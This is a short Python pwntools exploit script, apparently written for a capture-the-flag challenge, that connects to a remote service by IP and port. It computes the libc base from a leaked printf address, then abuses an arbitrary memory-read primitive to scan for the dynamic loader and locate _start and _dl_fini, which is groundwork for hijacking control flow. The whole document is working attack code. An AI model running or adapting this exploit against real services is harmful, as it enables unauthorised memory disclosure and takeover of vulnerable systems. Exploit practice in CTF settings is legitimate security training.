#!/usr/bin/python2

from pwn import *

def maketube():
	p = remote('159.203.116.12', 7777)
	p.recvuntil('printf(): ')
	libc_base = int(p.recvline()) - 0x55800
	return p, libc_base

def do_read(p, addr):
	p.recvuntil('read address:\n')
	p.sendline(str(addr))
	p.recvuntil('content: ')
	return int(p.recvline())

def leak(off):
	p, libc_base = maketube()
	x = do_read(p, libc_base + off)
	p.close()
	return x

ld_off = 0x3c6000 # libc end
while True:
	hdr = leak(ld_off)
	if p64(hdr)[:4] == '\x7fELF':
		break
	ld_off += 0x1000
print('[+] Found ld @ libc+0x{:x}'.format(ld_off))

entry_off = ld_off + leak(ld_off + 0x18)
print('[+] Found _start @ libc+0x{:x}'.format(entry_off))

lea = p64(leak(entry_off + 0x3a)) # lea rdx, [rip+X] (_dl_fini)
if lea[:3] != '\x48\x8d\x15':
	print('[-] Unexpected instruction')
	sys.exit(1)
dl_fini_off = entry_off + 0x3a + 7 + u32(lea[3:7])
print('[+] Found _dl_fini @ libc+0x{:x}'.format(dl_fini_off))
